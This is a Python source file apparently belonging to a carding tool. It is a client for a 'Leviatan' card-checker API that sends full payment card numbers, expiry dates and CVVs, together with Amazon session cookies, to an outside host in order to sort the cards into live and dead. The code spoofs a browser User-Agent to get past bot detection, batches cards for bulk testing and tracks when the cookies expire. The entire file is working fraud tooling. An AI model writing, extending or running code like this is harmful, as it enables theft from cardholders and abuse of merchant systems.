"""Amazon Auth Net checker — Leviatan API client.

Calls the Leviatan Amazon CHK API to validate cards.
Docs: POST https://leviatan-chk.site/amazon/leviatan

Key rules (from API docs):
  - DO NOT use proxies (API blocks them)
  - Always send a browser User-Agent
  - Card format: number|month|year|cvv (pipe only)
  - Single: {"card": "...", "cookies": "..."}
  - Multi:  {"card": ["...", "..."], "cookies": "..."}
"""

import asyncio
import logging
from dataclasses import dataclass
from typing import Optional, Union

import aiohttp

from core.card_parser import Card

logger = logging.getLogger(__name__)

API_URL = "https://leviatan-chk.site/amazon/leviatan"

# Browser User-Agent (API rejects python-requests / bot UAs)
DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

# Request timeout (Leviatan can be slow)
TIMEOUT_SECONDS = 60

# How many cards to send per batch request
BATCH_SIZE = 10


@dataclass
class AmazonResult:
    """Result of an Amazon card check."""
    status: str        # "APPROVED" | "DECLINED" | "ERROR"
    message: str       # Raw response message from API
    card_raw: str      # Original card string
    gateway: str = "Amazon Auth"


def _classify(status_str: str, message: str) -> str:
    """Classify an API response into APPROVED / DECLINED / ERROR."""
    s = (status_str or "").lower().strip()
    msg = (message or "").lower()

    if "approved" in s or "approved" in msg:
        return "APPROVED"

    # Declined markers (check before error — some declined messages
    # contain words like "failed" that overlap with error markers)
    declined_markers = [
        "declined",
        "card attempt limit",
        "invalid card",
        "do not retry",
        "cvv declined",
    ]
    if "declined" in s:
        return "DECLINED"
    for marker in declined_markers:
        if marker in msg:
            return "DECLINED"

    # Error indicators from the docs
    error_markers = [
        "failed to retrieve",
        "error generating",
        "amazon subscription failed",
        "amazon is down",
        "failed to link",
        "error accessing",
        "could not add",
        "no address is registered",
        "cookie expired",
        "sign in again",
        "error",
    ]
    for marker in error_markers:
        if marker in msg or marker in s:
            return "ERROR"
    # If status missing entirely, treat as error
    return "ERROR"


def _parse_response(data: dict, card_raw: str) -> AmazonResult:
    """Parse the Leviatan JSON response into an AmazonResult.

    Expected keys: "status", "message" (or "response").
    Status examples:
      ✅ Approved  /  ❌ Declined  /  ⚠️ Error
    """
    status_raw = data.get("status", "") or data.get("Status", "")
    message = data.get("message", "") or data.get("response", "") or data.get("Message", "")

    classification = _classify(status_raw, message)

    # Clean the status label for display (strip emoji prefix)
    clean_msg = message if message else status_raw

    return AmazonResult(
        status=classification,
        message=clean_msg or "No response from API",
        card_raw=card_raw,
    )


async def amazon_check_single(
    card: Card,
    cookies: str,
    timeout: int = TIMEOUT_SECONDS,
) -> AmazonResult:
    """Check a single card against the Leviatan Amazon API.

    Args:
        card: Parsed Card object.
        cookies: Amazon cookies string.
        timeout: Request timeout in seconds.
    Returns:
        AmazonResult with status + message.
    """
    card_str = f"{card.number}|{card.month}|{card.year}|{card.cvv}"
    payload = {"card": card_str, "cookies": cookies}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": DEFAULT_UA,
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                API_URL,
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as resp:
                text = await resp.text()
                try:
                    data = await resp.json(content_type=None)
                except Exception:
                    data = {"status": "⚠️ Error", "message": text[:500] or "Non-JSON response"}
                return _parse_response(data, card_str)
    except asyncio.TimeoutError:
        logger.warning("Amazon API timeout for card %s", card.masked)
        return AmazonResult("ERROR", "Request timed out. Try again.", card_str)
    except aiohttp.ClientError as e:
        logger.warning("Amazon API client error: %s", e)
        return AmazonResult("ERROR", f"Connection error: {e}", card_str)
    except Exception as e:
        logger.exception("Amazon API unexpected error: %s", e)
        return AmazonResult("ERROR", f"Unexpected error: {e}", card_str)


async def amazon_check_batch(
    cards: list[Card],
    cookies: str,
    timeout: int = TIMEOUT_SECONDS,
) -> list[AmazonResult]:
    """Check multiple cards in one API call (Leviatan multi-card support).

    Sends all cards in a single request; the API returns one result per card.
    Falls back to sequential single checks if the batch response shape is
    unexpected.
    """
    card_strs = [f"{c.number}|{c.month}|{c.year}|{c.cvv}" for c in cards]
    payload = {"card": card_strs, "cookies": cookies}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": DEFAULT_UA,
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                API_URL,
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as resp:
                try:
                    data = await resp.json(content_type=None)
                except Exception:
                    data = None

                if data is None:
                    # Non-JSON → fall back to sequential
                    return await _sequential_fallback(cards, cookies, timeout)

                # If the API returned a list of results (one per card)
                if isinstance(data, list):
                    results = []
                    for i, item in enumerate(data):
                        if isinstance(item, dict):
                            raw = card_strs[i] if i < len(card_strs) else ""
                            results.append(_parse_response(item, raw))
                        else:
                            raw = card_strs[i] if i < len(card_strs) else ""
                            results.append(AmazonResult("ERROR", str(item), raw))
                    # Pad if fewer results than cards
                    while len(results) < len(cards):
                        results.append(AmazonResult("ERROR", "Missing result", card_strs[len(results)]))
                    return results

                # Single dict response → use for all cards (degraded mode)
                if isinstance(data, dict):
                    result = _parse_response(data, card_strs[0])
                    if len(cards) == 1:
                        return [result]
                    # Same response applied to all — fall back to sequential
                    return await _sequential_fallback(cards, cookies, timeout)

                # Unknown shape → sequential
                return await _sequential_fallback(cards, cookies, timeout)

    except asyncio.TimeoutError:
        logger.warning("Amazon batch API timeout (%d cards)", len(cards))
        return [AmazonResult("ERROR", "Request timed out.", card_strs[i]) for i in range(len(cards))]
    except aiohttp.ClientError as e:
        logger.warning("Amazon batch API client error: %s", e)
        return [AmazonResult("ERROR", f"Connection error: {e}", card_strs[i]) for i in range(len(cards))]
    except Exception as e:
        logger.exception("Amazon batch API unexpected error: %s", e)
        return [AmazonResult("ERROR", f"Unexpected error: {e}", card_strs[i]) for i in range(len(cards))]


async def _sequential_fallback(cards: list[Card], cookies: str, timeout: int) -> list[AmazonResult]:
    """Sequential single-card checks as a fallback for batch failure."""
    results = []
    for card in cards:
        r = await amazon_check_single(card, cookies, timeout)
        results.append(r)
    return results


def is_cookie_expired(result: AmazonResult) -> bool:
    """Check if an AmazonResult indicates the cookies have expired."""
    msg = (result.message or "").lower()
    return "cookie expired" in msg or "sign in again" in msg
